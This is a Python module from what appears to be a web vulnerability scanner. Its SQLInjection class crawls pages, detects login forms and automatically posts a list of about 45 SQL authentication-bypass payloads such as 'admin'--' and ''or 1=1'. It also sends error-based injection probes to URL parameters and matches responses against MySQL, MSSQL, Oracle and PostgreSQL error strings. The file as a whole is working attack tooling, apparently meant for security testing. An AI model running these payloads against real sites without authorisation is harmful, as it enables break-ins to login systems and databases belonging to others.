__version__ = "0.5.0"
__license__ = "GPL v2.0"
__author__ = "Jonathan Castro"
__author_email__ = "Jonathan Castro, jonathancastrogonzalez at gmail dot com"

import json
import requests
import urllib.parse
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from urllib.parse import urlsplit

from backend.core.url import URL
from backend.core.url_list import URLlist
from backend.core.db_adapter import DBAdapter

# For normal injection; search for login forms, try and if the login form is still there, that injection didn't work.

api = "http://localhost:3000/saveresult"

class SQLInjection(object):
    def __init__(self, url_list, process, user):
        self.process = process
        self.user = user

        if url_list is None:
            self.url_list = URLlist()
        else:
            self.url_list = url_list

        db = DBAdapter()
        db.update_process(process, 3)  # Status: 3, SQL injection search.
        db.close_connection()

        # http://stackoverflow.com/questions/9626535/get-domain-name-from-url
        # self.domain = "{0.scheme}://{0.netloc}/".format(urllib.parse.urlsplit(url))

        # http://www.hacoder.com/2015/10/sql-injection-authentication-bypass-cheat-sheet/
        self.input_data = [
            'admin\'--',
            '\' or 1=1',
            ' or 1=1',
            'or 1=1--',
            'or 1=1#',
            'or 1=1/*',
            'admin\' #',
            'admin\'/*',
            'admin\' or \'1\'=\'1',
            'admin\' or \'1\'=\'1\'--',
            'admin\' or \'1\'=\'1\'#',
            'admin\' or \'1\'=\'1\'/*',
            'admin\'or 1=1 or \'\'=\'',
            'admin\' or 1=1',
            'admin\' or 1=1--',
            'admin\' or 1=1#',
            'admin\' or 1=1/*',
            'admin\') or (\'1\'=\'1',
            'admin\') or (\'1\'=\'1\'--',
            'admin\') or (\'1\'=\'1\'#',
            'admin\') or (\'1\'=\'1\'/*',
            'admin\') or \'1\'=\'1',
            'admin\') or \'1\'=\'1\'--',
            'admin\') or \'1\'=\'1\'#',
            'admin\') or \'1\'=\'1\'/*',
            'admin" --',
            'admin" #',
            'admin"/*',
            'admin" or "1"="1',
            'admin" or "1"="1"--',
            'admin" or "1"="1"#',
            'admin" or "1"="1"/*',
            'admin"or 1=1 or ""="',
            'admin" or 1=1',
            'admin" or 1=1--',
            'admin" or 1=1#',
            'admin" or 1=1/*',
            'admin") or ("1"="1',
            'admin") or ("1"="1"--',
            'admin") or ("1"="1"#',
            'admin") or ("1"="1"/*',
            'admin") or "1"="1',
            'admin") or "1"="1"--',
            'admin") or "1"="1"#',
            'admin") or "1"="1"/*'
        ]

        self.error_based_sqli_param_data = [
            '\'',
            'A%\' and 1=1--',
            'A%\' and 1=2--'
        ]

        # self.serialized_param_data = []

        # https://www.owasp.org/images/5/52/OWASP_Testing_Guide_v4.pdf, page 111.
        self.sql_errors = {
            'MySQL': 'you have an error in your sql syntax',
            'MSSQL': 'microsoft sql native client error',
            'Oracle': 'ora-00933: sql command not properly ended',
            'PostgreSQL': 'query failed: error: syntax error at or near'
        }

    def search_injections(self):
        while True:
            url = self.url_list.get_url()
            if url is None or type(url) is not URL:
                break

            if url.is_online():
                self.__authentication_attempt(url)
                self.__error_based_sqli(url)
                # self.__serialized_sqli(url)

    def __authentication_attempt(self, url):
        web = url.get_content()
        forms = web('form')
        for form in forms:
            action = form.get("action")
            domain = "{0.scheme}://{0.netloc}/".format(urlsplit(action))
            if domain == ":///":  # The link may be relative.
                action = urljoin(url.get_url(), action)
            inputs = form('input')
            data = []
            input_text_counter = 0
            input_pass_counter = 0
            for i in inputs:  # If there is a form with only a text and a password input then it's a logging in form.
                t = i.get("type")
                if t == "text":
                    input_text_counter += 1
                elif t == "password":
                    input_pass_counter += 1
                data.append(i.get("name"))

                if input_text_counter > 2 or input_pass_counter > 2:
                    break

            if input_text_counter == 1 and input_pass_counter == 1:  # Form found.
                for i in self.input_data:  # Attempting signing in with injection examples.
                    d = {
                        data[0]: i,
                        data[1]: i
                    }
                    r = requests.post(action, data=urllib.parse.urlencode(d))
                    response = r.text
                    if action not in response:  # If the logging form doesn't exist, the attempt is a success.
                        self.__save_results(url, 1)
                        return True  # It is not necessary to keep going, we found an sql injection.
        return False

    def __error_based_sqli(self, url):
        params = self.__get_parameters(url.get_url())
        u = "{0.scheme}://{0.netloc}{0.path}".format(urllib.parse.urlsplit(url.get_url()))
        for x, y in params:
            for p in self.error_based_sqli_param_data:
                data = {
                    x: p
                }
                r = requests.get(u, params=urllib.parse.urlencode(data))
                response = r.text
                for d, e in self.sql_errors.items():
                    if e in response.lower():
                        self.__save_results(url, 2)
                        return True
        return False

    def __time_based_blind_sqli(self, url):
        # params = self.__get_parameters(url)
        # self.__save_results(url, 3)
        return False

    def __serialized_sqli(self, url):
        # params = self.__get_parameters(url)
        # self.__save_results(url, 4)
        return False

    def __get_parameters(self, url):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qsl(parsed.query)
        return params

    def __save_results(self, web, v_type):
        w = web.get_url()
        db = DBAdapter()
        db.vulnerability_found(self.process, w, v_type)
        db.close_connection()

        if v_type == 1:
            v = "Authentication attempt"
        elif v_type == 2:
            v = "Error based SQL injection"
        else:
            v = "SQL injection"

        data = {
            "PROCESS": self.process,
            "WEB": w,
            "VULNERABILITY": v,
            "USER": self.user
        }
        requests.post(api, json=data)
